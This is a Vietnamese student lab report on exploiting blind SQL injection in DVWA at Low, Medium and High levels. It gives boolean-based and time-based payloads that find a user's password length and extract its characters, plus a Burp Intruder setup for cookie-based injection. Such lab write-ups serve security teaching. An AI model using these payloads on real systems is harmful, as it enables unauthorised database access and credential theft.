# BÁO CÁO QUÁ TRÌNH KHAI THÁC BLIND SQL INJECTION (LOW, MEDIUM, HIGH)

---

## 1. BLIND SQL INJECTION (LOW)

Đầu tiên, giao diện xuất hiện một text field cho phép người dùng nhập ID của người dùng:

![alt text](images/Screenshot 2025-07-16 012222.png)

Nhận thấy khi nhập user ID, server sẽ trả về hai trạng thái là *exists* và *MISSING*:

![alt text](images/Screenshot 2025-07-16 012834.png)
![alt text](images/Screenshot 2025-07-16 012852.png)

&rarr; **Do đó mà ta có thể thử khai thác lỗ hổng Blind SQLi dạng boolean.**

Thực hiện test các payload như bên dưới để kiểm tra SQL injection:

```SQL
 1’ -- -
 1’ and 1=1 -- -
 1’ and 1=0 -- -
```

![alt text](images/Screenshot 2025-07-16 013159.png)
![alt text](images/Screenshot 2025-07-16 013223.png)


Dựa vào lab SQLi, ta biết CSDL có table là users có cột như password và user_id, dựa vào đây ta có thể thực hiện dò đoán thử password của user.

Ta thực hiện tạo các payload dò độ dài của password của user có ID là 1 như sau: 

```SQL
1’ and (SELECT length(password) FROM users WHERE user_id=1) > 1/2/3/4/5…
```

Thực hiện lặp lại cho đến khi độ dài được xác định khi một số trả về *MISSING*, nhưng số liền trước của nó lại trả về *exists*.

Nhận thấy với payload:

```SQL
1’ and (SELECT length(password) FROM users WHERE user_id=1) > 31 -- -
```

Server vẫn trả về exists, nhưng với > 32 thì lại trả về *MISSING*
&rarr; **Do đó có thể kết luận dộ dài của password của user id 1 là 32.**

![alt text](images/Screenshot 2025-07-16 160722.png)
![alt text](images/Screenshot 2025-07-16 160752.png)

Thực hiện tạo các payload dò các ký tự trong password của user có ID là 1 như sau: 

```SQL
1’ and (SELECT substring(password,0,1) FROM users WHERE user_id=1)=’a’/’b’/’c’/…
```

Tương tự thực hiện lặp lại nếu đúng ký tự sẽ trả về *exists* còn không là *MISSING*.

Trong đó hàm *substring(password,0,1)* sẽ thực hiện lấy 1 ký tự vị trí 0 của password.

Để thực hiện dò password, ta sử dụng công cụ Intruder ở chế độ Cluster Bomb với hai vị trí cần dò là vị trí cần substring: *substring(password,**0**,1)* và ký tự cần dò.

![alt text](images/Screenshot 2025-07-16 161037.png)

Trong đó setting vị trí payload 1 như dưới:

![alt text](images/Screenshot 2025-07-16 161106.png)

Trong đó setting vị trí payload 2 như dưới:

![alt text](images/Screenshot 2025-07-16 161135.png)

Tạo grep-match như dưới:

![alt text](images/Screenshot 2025-07-16 161156.png)

Kết quả sau khi thực hiện brute force dò password:

![alt text](images/Screenshot 2025-07-16 161223.png)

***Note:*** *Em dùng burpsuite bản thường dò lâu quá nên em pass qua phần này ạ.*

---

## 2. BLIND SQL INJECTION (MEDIUM)

Giao diện xuất hiện một select option cho phép người dùng chọn ID của người dùng và gửi:

![alt text](images/Screenshot 2025-07-16 161440.png)

Dữ liệu id được đưa vào câu truy vấn không đặt trong dấu ‘...’

![alt text](images/Screenshot 2025-07-16 161508.png)

Sử dụng một cách khai thác lỗ hổng Blind SQLi khác đó dạng dựa trên *time-based*, sử dụng thời gian làm đối trọng.

Khi thực hiện gửi đi payload như sau:  

```SQL
1 or sleep(1) 
```

Ta sẽ thấy server gửi lại phản hồi chậm mất 1s so với thông thường:

![alt text](images/Screenshot 2025-07-16 161634.png)

Tạo payload kết hợp với các truy vấn điều kiện *if*:

```SQL
1 or if (1<2, sleep(1), 0) 
1 or if (1>2, sleep(1), 0)
```

Nếu câu điều kiện thỏa mãn sẽ thực hiện sleep(1), dó đó mà server sẽ phản hồi chậm còn nếu câu điều kiện sai sẽ trả về giá trị 0 và lúc này server sẽ phản hổi ngay:

![alt text](images/Screenshot 2025-07-16 161753.png)

&rarr; Nhận thấy server phản hồi trong 5s.

![alt text](images/Screenshot 2025-07-16 161851.png)

&rarr; Server phản hồi ngay trong 1s.

Tiếp tục tạo payload sau để dò đoán độ dài của password:


```SQL
1 or IF ((select length(password) from users where user_id=1) > 1/2/3/4/….., SLEEP(1), 0) 
```

![alt text](images/Screenshot 2025-07-16 162019.png)
![alt text](images/Screenshot 2025-07-16 162032.png)

&rarr; Kết quả là 32 ký tự.

---

## 3. BLIND SQL INJECTION (HIGH)

Giao diện xuất hiện một link *Click here…*, khi người dùng thực hiện click đường link sẽ xuất hiện một form giao diện cho phép người dùng nhập id và gửi đi:

![alt text](images/Screenshot 2025-07-16 162143.png)

Kiểm tra source PHP:

![alt text](images/Screenshot 2025-07-16 162207.png)

&rarr; Ta có thể nhận thấy, giá trị id lúc này được lấy từ cookie của trình duyệt, rồi sử dụng giá trị đó để chèn vào câu lệnh SQL.

Ta có thể thấy điều đó rõ hơn trong hai mẫu request được gửi đi:

![alt text](images/Screenshot 2025-07-16 162254.png)
![alt text](images/Screenshot 2025-07-16 162306.png)

Lúc này câu hỏi đặt ra là liệu có thể sửa phần *Cookie: id=...* của request GET để chèn thành payload blind SQLi hay không?

Để kiểm tra, ta tiếp tục thực hiện chèn payload như sau trong id:

```SQL
1’ or if (1<2, sleep(5), 0) -- -
1’ or if (1>2, sleep(5), 0) -- -
```

Nếu tồn tại lỗ hổng SQLi cả hai payload đều sẽ được thực hiện truy vấn, câu 1 sẽ khiến server phản hồi chậm hơn nhiều do hàm sleep(5) được thực thi trong câu điều kiện, ngược lại câu hai sẽ được phản hồi như bình thường.

![alt text](images/Screenshot 2025-07-16 162441.png)
![alt text](images/Screenshot 2025-07-16 162451.png)

&rarr; Kết quả cho thấy hệ thống tồn tại SQLi.

Tương tự ta có thể dụng payload để dò đoán độ dài của password: 

```SQL
1’ or IF ((select length(password) from users where user_id=1) > 1/2/3/4/…, SLEEP(1), 0) -- -
```

![alt text](images/Screenshot 2025-07-16 162742.png)
![alt text](images/Screenshot 2025-07-16 162755.png)

&rarr; Kết quả tương tụ có 32 ký tư.

Tiếp tục ta có thể tạo payload để thực hiện dò các ký tự trong password của user có id là 1:

```SQL
1' or if ((select substring(password,1,1) from users where user_id=1)=’a’/'b'/’c’/…, sleep(5), 0) -- -
```

Trong công cụ Intruder ta cấu hình như sau:

```SQL
1' or if ((select substring(password,§1§,1) from users where user_id=1)='§a§', sleep(5), 0) -- -
```

![alt text](images/Screenshot 2025-07-16 162954.png)
![alt text](images/Screenshot 2025-07-16 163019.png)
![alt text](images/Screenshot 2025-07-16 163034.png)

Kết quả sau khi thực hiện tấn công, ta có thể thấy những request có phản hồi chậm hơn so với các request khác đúng ký tự tương ứng với vị trí trong password của người dùng id 1:

![alt text](images/Screenshot 2025-07-16 163105.png)

---

## ✅ Kết luận:

Thành công khai thác lỗ hổng Blind SQLi trên lab DVWA.

---

